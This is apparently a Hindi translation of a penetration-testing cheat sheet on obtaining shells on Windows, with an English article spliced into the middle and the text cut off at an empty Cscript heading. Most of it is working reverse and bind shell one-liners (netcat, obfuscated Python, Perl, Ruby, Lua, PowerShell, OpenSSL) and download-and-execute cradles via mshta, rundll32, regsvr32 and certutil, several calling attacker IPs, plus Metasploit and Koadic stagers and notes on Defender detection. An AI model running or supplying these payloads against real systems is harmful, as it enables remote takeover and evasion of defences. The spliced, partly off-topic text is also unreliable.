# शेल्स - विंडोज

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ हैकट्रिक्स क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

विशेषता को खोजें जो सबसे महत्वपूर्ण हैं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमला सतह का ट्रैक करता है, प्रोएक्टिव धमकी स्कैन चलाता है, आपकी पूरी टेक स्टैक, एपीआई से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याएं खोजता है। [**आज ही मुफ्त में इसे ट्राय करें**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

पृष्ठ [lolbas-project.github.io](https://lolbas-project.github.io/) विंडोज के लिए है जैसे [https://gtfobins.github.io/](https://gtfobins.github.io/) लिनक्स के लिए है।\
स्वाभाविक रूप से, **विंडोज में SUID फ़ाइलें या sudo अधिकार नहीं होते हैं**, लेकिन यह जानना उपयोगी होता है **कि** कुछ **बाइनरी** कैसे (अवैध रूप से) **अप्रत्याशित कार्रवाई** करने के लिए (एक्सीक्यूट) किया जा सकता है।

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** एक Netcat-clone है, जो पोर्टेबल होने और मजबूत एन्क्रिप्शन प्रदान करने के लिए डिज़ाइन किया गया है। यह Unix-प्रकार के ऑपरेटिंग सिस्टम और Microsoft Win32 पर चलता है। sbd में AES-CBC-128 + HMAC-SHA1 एन्क्रिप्शन (Christophe Devine द्वारा), प्रोग्राम का निष्पादन (-e विकल्प), स्रोत पोर्ट का चयन, देरी के साथ निरंतर पुनर्संयोजन और कुछ अन्य अच्छी सुविधाएं शामिल हैं। sbd केवल TCP/IP संचार का समर्थन करता है। sbd.exe (Kali linux वितरण का हिस्सा: /usr/share/windows-resources/sbd/sbd.exe) को एक Netcat विकल्प के रूप में एक Windows बॉक्स पर अपलोड किया जा सकता है।

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## पर्ल

Perl एक शक्तिशाली और लोकप्रिय स्क्रिप्टिंग भाषा है जिसे विभिन्न कार्यों के लिए उपयोग किया जा सकता है। यह एक उच्च स्तरीय भाषा है जिसमें विभिन्न ऑपरेशन्स और फंक्शन्स का समर्थन किया जाता है। Perl का उपयोग विभिन्न वेब एप्लीकेशन, डेटा मानिपुलेशन, टेक्स्ट प्रसंस्करण, नेटवर्किंग, और बहुत कुछ के लिए किया जा सकता है।

### Perl शेल

Perl शेल का उपयोग करके आप विभिन्न कार्यों को स्वतंत्र रूप से और सुरक्षित ढंग से कर सकते हैं। यह शेल आपको विभिन्न सिस्टम कमांड्स का उपयोग करने की अनुमति देती है और आपको विभिन्न फ़ाइल और नेटवर्क ऑपरेशन्स को भी संचालित करने की अनुमति देती है।

यहां कुछ उपयोगी Perl शेल कमांड्स हैं:

- `system`: इस कमांड का उपयोग सिस्टम कमांड्स को चलाने के लिए किया जाता है।
- `exec`: इस कमांड का उपयोग एक अन्य प्रोग्राम को चलाने के लिए किया जाता है।
- `open`: इस कमांड का उपयोग फ़ाइलों को खोलने और पढ़ने के लिए किया जाता है।
- `close`: इस कमांड का उपयोग फ़ाइलों को बंद करने के लिए किया जाता है।
- `chdir`: इस कमांड का उपयोग वर्तमान डायरेक्टरी को बदलने के लिए किया जाता है।

इन कमांड्स का उपयोग करके आप विभिन्न सिस्टम ऑपरेशन्स को संचालित कर सकते हैं और अपनी आवश्यकताओं को पूरा कर सकते हैं।
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## रूबी

Ruby एक उच्च स्तरीय, विभाजनयोग्य, विन्यासयोग्य, ओपन स्रोत प्रोग्रामिंग भाषा है। यह एक विशेषता-आधारित भाषा है जिसमें विशेषताएं और विधियाँ आसानी से जोड़ी जा सकती हैं। यह एक शक्तिशाली और अनुकरणीय भाषा है जिसे विभिन्न डोमेन में उपयोग किया जा सकता है।

### रूबी शेल

रूबी शेल एक उपयोगी उपकरण है जो रूबी कोड को चलाने और निर्देशित करने की अनुमति देता है। यह एक इंटरैक्टिव शेल है जिसमें आप रूबी कोड को लाइन-बाय-लाइन चला सकते हैं और परिणामों को तुरंत देख सकते हैं। रूबी शेल का उपयोग करके आप रूबी कोड को परीक्षण कर सकते हैं, विभिन्न कार्यों को निष्पादित कर सकते हैं और अनुकरणीय तकनीकों को विकसित कर सकते हैं।

### रूबी शेल का उपयोग करना

रूबी शेल को चलाने के लिए, आपको रूबी इंस्टॉल करना होगा। इंस्टॉलेशन के बाद, आप टर्मिनल या कमांड प्रोंप्ट में `irb` टाइप करके रूबी शेल में प्रवेश कर सकते हैं। यह आपको एक प्रोंप्ट प्रदान करेगा जहां से आप रूबी कोड लिख सकते हैं और उसे चला सकते हैं।

यहां कुछ उपयोगी रूबी शेल कमांड हैं:

- `puts`: यह एक संदेश प्रिंट करता है।
- `gets`: यह उपयोगकर्ता से इनपुट प्राप्त करता है।
- `if`, `else`, `elsif`: ये शर्तों को निर्धारित करने के लिए उपयोग होते हैं।
- `while`, `until`: ये लूप को निर्देशित करने के लिए उपयोग होते हैं।
- `def`, `end`: ये फ़ंक्शन निर्धारित करने के लिए उपयोग होते हैं।

आप रूबी शेल में इन कमांड का उपयोग करके अपने कोड को चला सकते हैं और अपनी आवश्यकताओं के अनुसार उन्हें समायोजित कर सकते हैं।
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## लुआ

Lua एक लाइटवेट, तेज़ और प्रोग्रामिंग भाषा है जो विभिन्न प्लेटफ़ॉर्मों पर चलती है। यह एक स्क्रिप्टिंग भाषा है जिसे विभिन्न उद्देश्यों के लिए उपयोग किया जा सकता है, जैसे कि गेम डेवलपमेंट, एप्लिकेशन एक्सटेंशन और वेब डेवलपमेंट।

Lua का उपयोग करके, आप विभिन्न कार्यों को संपादित कर सकते हैं, जैसे कि फ़ाइल ऑपरेशन, नेटवर्किंग, डेटा संरचना और अन्य टास्क। यह एक अच्छा विकल्प है जब आपको एक लाइटवेट और तेज़ भाषा की आवश्यकता होती है जो आपको अपने परियोजनाओं को आसानी से व्यवस्थित करने में मदद कर सके।

यदि आपको Lua का उपयोग करके विंडोज़ शेल को हैक करने की आवश्यकता होती है, तो आप विभिन्न तकनीकों का उपयोग कर सकते हैं, जैसे कि रिमोट शेल एक्सीक्यूशन, शेल कोड इंजेक्शन और शेल अक्सेस कंट्रोल। यह आपको विंडोज़ में अनुमति देता है कि आप विभिन्न कार्यों को अपनी इच्छानुसार संपादित कर सकें और अनुकूलित कर सकें।
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

हमलावर (काली)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows machine.

## Reverse Shells

A reverse shell is a technique where the compromised system connects back to the attacker's machine, allowing the attacker to execute commands remotely. There are several ways to achieve a reverse shell on a Windows system:

### Netcat

Netcat is a versatile networking utility that can be used to establish a reverse shell connection. The following command can be used to create a reverse shell using Netcat:

```plaintext
nc -e cmd.exe <attacker_ip> <port>
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### PowerShell

PowerShell is a powerful scripting language built into Windows. It can be used to create a reverse shell connection using the following command:

```plaintext
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### Metasploit

Metasploit is a popular framework for developing and executing exploits. It provides a wide range of modules for various hacking techniques, including obtaining a reverse shell on a Windows system. The following command can be used to create a reverse shell using Metasploit:

```plaintext
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Bind Shells

A bind shell is a technique where the compromised system listens for incoming connections from the attacker's machine, allowing the attacker to execute commands remotely. There are several ways to achieve a bind shell on a Windows system:

### Netcat

Netcat can also be used to create a bind shell connection. The following command can be used to create a bind shell using Netcat:

```plaintext
nc -lvp <port> -e cmd.exe
```

Replace `<port>` with the desired port number.

### PowerShell

PowerShell can also be used to create a bind shell connection. The following command can be used to create a bind shell using PowerShell:

```plaintext
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, <port>); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Replace `<port>` with the desired port number.

### Metasploit

Metasploit can also be used to create a bind shell connection. The following command can be used to create a bind shell using Metasploit:

```plaintext
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set LPORT <port>
exploit
```

Replace `<port>` with the desired port number.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the hacking process. Reverse shells and bind shells provide attackers with remote access to compromised systems, allowing them to execute commands and carry out further malicious activities. It is important for security professionals to be aware of these techniques in order to defend against them effectively.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## पॉवरशेल

Powershell एक शक्तिशाली और सुरक्षित कमांड लाइन इंटरफ़ेस (CLI) है जो माइक्रोसॉफ्ट विंडोज़ सिस्टम पर उपयोग होता है। यह एक स्क्रिप्टिंग भाषा भी है जिसका उपयोग विंडोज़ सिस्टम के साथ-साथ अन्य ऐप्लिकेशन और सेवाओं को भी नियंत्रित करने के लिए किया जा सकता है।

Powershell के कुछ महत्वपूर्ण फ़ंक्शन्स शामिल हैं:
- फ़ाइलों और फ़ोल्डरों को प्रबंधित करने के लिए कमांड्स
- रजिस्ट्री को प्रबंधित करने के लिए कमांड्स
- प्रक्रियाओं को नियंत्रित करने के लिए कमांड्स
- सेवाओं को नियंत्रित करने के लिए कमांड्स
- नेटवर्क कनेक्शन्स को प्रबंधित करने के लिए कमांड्स

Powershell का उपयोग करके हैकर्स विभिन्न तकनीकों का उपयोग कर सकते हैं, जैसे कि:
- रिमोट मशीनों पर स्क्रिप्ट चलाना
- विंडोज़ रजिस्ट्री को अद्यतन करना
- नेटवर्क ट्रैफ़िक को स्निफ़ करना
- फ़ाइलों को छिपाना और छिपाने के लिए उपयोग करना
- विंडोज़ सेवाओं को नियंत्रित करना

Powershell का उपयोग करने के लिए, आपको इसे विंडोज़ सिस्टम पर इंस्टॉल करना होगा। इसके बाद, आप इंटरफ़ेस के माध्यम से कमांड्स दर्ज करके और स्क्रिप्ट चलाकर Powershell का उपयोग कर सकते हैं।
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
नेटवर्क कॉल करने वाली प्रक्रिया: **powershell.exe**\
डिस्क पर लिखी गई पेलोड: **नहीं** (_कम से कम जहां तक मैंने procmon का उपयोग करके खोजा हैं!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**इस दस्तावेज़ के अंत में विभिन्न Powershell शैल्स के बारे में अधिक जानकारी प्राप्त करें**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
नेटवर्क कॉल करने वाली प्रक्रिया: **mshta.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```bash
mshta http://webserver/payload.hta
```
नेटवर्क कॉल करने वाली प्रक्रिया: **mshta.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**
```bash
mshta \\webdavserver\folder\payload.hta
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

#### **hta-psh रिवर्स शेल का उदाहरण (hta का उपयोग करके PS बैकडोर डाउनलोड और निष्पादित करें)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**आप आसानी से Koadic zombie को stager hta का उपयोग करके डाउनलोड और निष्पादित कर सकते हैं**

#### hta उदाहरण
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

यह तकनीक mshta और sct फ़ाइलों का उपयोग करके एक विंडोज़ शेल चलाने के लिए है।

यह तकनीक निम्नलिखित चरणों का पालन करती है:

1. mshta.exe को चलाएं और इसे sct फ़ाइल के साथ एक स्क्रिप्ट फ़ाइल के रूप में उपयोग करें।
2. sct फ़ाइल में एक VBScript या JScript स्क्रिप्ट होना चाहिए, जो शेल को चलाने के लिए उपयोग होगा।
3. शेल को चलाने के लिए एक विंडोज़ शॉर्टकट बनाएं और उसे एक विंडोज़ शॉर्टकट फ़ाइल (.lnk) के रूप में सहेजें।
4. शॉर्टकट फ़ाइल को चलाएं और शेल को चलाएं।

इस तकनीक का उपयोग करके, हम एक विंडोज़ शेल को चला सकते हैं और उसे अपनी इच्छानुसार नियंत्रित कर सकते हैं।
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

यह तकनीक Metasploit फ्रेमवर्क का उपयोग करके एक विंडोज़ शेल खोलने के लिए है। यह तकनीक एक HTA (HTML Application) फ़ाइल का उपयोग करती है जो एक वेब पेज के रूप में दिखती है, लेकिन वास्तविकता में एक शेल खोलती है। इस तकनीक का उपयोग करके, हम एक विंडोज़ शेल को रिमोट रूप से खोल सकते हैं और उसे Metasploit के साथ जोड़ सकते हैं।

इस तकनीक का उपयोग करने के लिए, हमें एक HTA फ़ाइल बनानी होगी जिसमें शेल कोड होगा। फिर हमें इस फ़ाइल को शिकारी के पास भेजना होगा और उसे खोलने के लिए उसे प्रेरित करना होगा। जब शिकारी इस फ़ाइल को खोलेगा, शेल कोड चलेगा और एक विंडोज़ शेल खुलेगी। इसके बाद, हम शिकारी के सिस्टम पर रिमोट रूप से शेल के नियंत्रण को प्राप्त कर सकते हैं।

इस तकनीक का उपयोग करने के लिए, हमें निम्नलिखित कदमों का पालन करना होगा:

1. HTA फ़ाइल बनाएं और उसमें शेल कोड जोड़ें।
2. HTA फ़ाइल को शिकारी के पास भेजें और उसे खोलने के लिए प्रेरित करें।
3. शिकारी के सिस्टम पर रिमोट शेल के नियंत्रण को प्राप्त करें।

इस तकनीक के लिए, हमें Metasploit फ्रेमवर्क का उपयोग करना होगा। Metasploit के साथ शेल कोड जोड़ने के लिए, हम निम्नलिखित कदमों का पालन करेंगे:

1. Metasploit खोलें और एक नया सत्र शुरू करें।
2. `use exploit/windows/browser/mshta` कमांड का उपयोग करें।
3. `set payload windows/meterpreter/reverse_tcp` कमांड का उपयोग करें।
4. `set LHOST <आपका IP>` कमांड का उपयोग करें।
5. `set LPORT <एक उपयुक्त पोर्ट>` कमांड का उपयोग करें।
6. `exploit` कमांड का उपयोग करें।
7. HTA फ़ाइल को शिकारी के पास भेजें और उसे खोलने के लिए प्रेरित करें।
8. शिकारी के सिस्टम पर रिमोट शेल के नियंत्रण को प्राप्त करें।
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**डिफेंडर द्वारा पहचाना गया**

## **Rundll32**

[**Dll हैलो वर्ल्ड उदाहरण**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
नेटवर्क कॉल करने वाली प्रक्रिया: **rundll32.exe**\
डिस्क पर लिखी गई पेलोड: **IE स्थानीय कैश**

**डिफेंडर द्वारा पहचाना गया**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
**यहां से निकाला गया है** [**यहां**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)

#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. Koadic is a post-exploitation tool that utilizes Rundll32 to establish a command and control channel on a compromised Windows machine.

To use Rundll32 with Koadic, follow these steps:

1. Generate a malicious DLL payload using Koadic.
2. Transfer the payload to the target machine.
3. Open a command prompt on the target machine.
4. Use the following command to execute the payload:

```
rundll32.exe <path_to_payload.dll>,<entry_point_function>
```

Replace `<path_to_payload.dll>` with the path to the transferred payload DLL file, and `<entry_point_function>` with the name of the function within the DLL that you want to execute.

By using Rundll32 with Koadic, you can establish a covert communication channel with the compromised machine, allowing you to perform various post-exploitation activities, such as executing commands, accessing files, and pivoting to other systems on the network.

Note: Be cautious when using Rundll32 for malicious purposes, as it can raise suspicion and trigger security alerts. Always ensure you have proper authorization and legal permission before conducting any hacking activities.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## रेगिस्ट्री सर्वर 32

यह एक विंडोज उपकरण है जिसका उपयोग रेगिस्ट्री में DLL फ़ाइलों को पंजीकृत करने के लिए किया जाता है। इसका उपयोग किसी भी DLL फ़ाइल को रेगिस्ट्री में पंजीकृत करने के लिए किया जा सकता है, जिससे उस DLL को विंडोज द्वारा पहचाना जा सके और उसका उपयोग किया जा सके। इसका उपयोग एक्सप्लोइट विकसित करने, रेमोट कंट्रोल प्राप्त करने और अनधिकृत उपयोगकर्ता के लिए एक शेल प्राप्त करने के लिए भी किया जा सकता है।

इस तकनीक का उपयोग करने के लिए, आपको `regsvr32` कमांड का उपयोग करके एक DLL फ़ाइल को पंजीकृत करना होगा। इसके लिए, आपको निम्नलिखित कमांड को उदाहरण के रूप में उपयोग कर सकते हैं:

```plaintext
regsvr32 /s C:\path\to\file.dll
```

यह कमांड द्वारा दिए गए DLL फ़ाइल को सुनिश्चित करेगी कि वह पंजीकृत हो जाए और उसे विंडोज द्वारा पहचाना जा सके। यदि कोई त्रुटि होती है, तो त्रुटि संदेश प्रदर्शित होगा।

ध्यान दें कि इस तकनीक का उपयोग करने के लिए आपको व्यवस्थापक अधिकार होना चाहिए।
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
नेटवर्क कॉल करने वाली प्रक्रिया: **regsvr32.exe**\
डिस्क पर लिखित पेलोड: **IE स्थानीय कैश**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
नेटवर्क कॉल करने वाली प्रक्रिया: **svchost.exe**\
डिस्क पर लिखी गई पेलोड: **WebDAV क्लाइंट स्थानीय कैश**

**डिफेंडर द्वारा पहचाना गया**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
**यहां से निकाला गया है** [**यहां**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)

#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**आप आसानी से एक Koadic zombie को डाउनलोड और एक्सीक्यूट कर सकते हैं stager regsvr का उपयोग करके**

## Certutil

एक B64dll डाउनलोड करें, इसे डिकोड करें और इसे एक्सीक्यूट करें।
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
एक B64exe डाउनलोड करें, इसे डिकोड करें और इसे निष्पादित करें।
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**डिफेंडर द्वारा पहचाना गया**

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण संकटों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह का पता लगाता है, प्रोएक्टिव धारणा स्कैन चलाता है, आपकी पूरी टेक स्टैक, API से वेब ऐप्स और क्लाउड सिस्टम तक, में समस्याओं की खोज करता है। [**इसे नि: शुल्क में आज़माएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
